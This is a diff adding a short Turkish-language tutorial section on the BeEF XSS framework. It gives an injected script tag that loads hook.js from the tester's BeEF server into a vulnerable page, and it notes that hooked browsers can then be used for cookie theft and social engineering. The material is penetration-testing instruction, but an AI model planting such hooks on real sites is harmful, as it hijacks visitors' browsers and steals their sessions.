@@ -66,3 +66,15 @@ Neden sürekli <script>alert()</script> denendiği sebebine gelirsek. Bu, pop-up
 
 ## **BEEF XSS exploitation framework**
 
+BeEF, profesyonel penetrasyon test cihazının istemci taraflı saldırı vektörlerini kullanarak gerçek bir hedef güvenlik ortamını değerlendirebilmesini sağlayan bir framework'tür.
+
+Beef'i çalıştırdıktan sonra terminalde çıkan 2 ip.
+
+```
+[*]  Web UI: http://127.0.0.1:3000/ui/panel
+[*]  Hook: <script src="http://127.0.0.1:3000/hook.js"></script>
+```
+
+"<script>alert()</script>" ile xss'in tespit edildiği yerde "<script src="http://127.0.0.1:3000/hook.js"></script>" çalıştırıyoruz ve beef panelinde online browsers kısmında siteyi görüyoruz. Burdan sonra command kısmında gelip cookielerin çalınmasından sosyal mühendislik saldırılarına kadar pek çok şey yapılabilir.
+
+## **Reflected XSS**
